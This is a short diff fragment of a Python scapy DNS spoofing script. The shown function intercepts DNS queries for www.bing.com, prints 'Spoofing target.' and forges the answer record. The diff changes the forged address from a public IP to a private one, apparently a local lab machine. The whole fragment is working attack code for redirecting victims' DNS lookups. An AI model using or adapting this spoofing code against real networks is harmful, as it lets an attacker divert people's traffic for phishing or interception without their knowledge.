@@ -11,7 +11,7 @@ def process_packet(packet):
 
         if 'www.bing.com' in str(qname):
             print('[+] Spoofing target.')
-            answer = scapy.DNSRR(rrname=qname, rdata='142.250.189.14')
+            answer = scapy.DNSRR(rrname=qname, rdata='10.211.55.4')
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
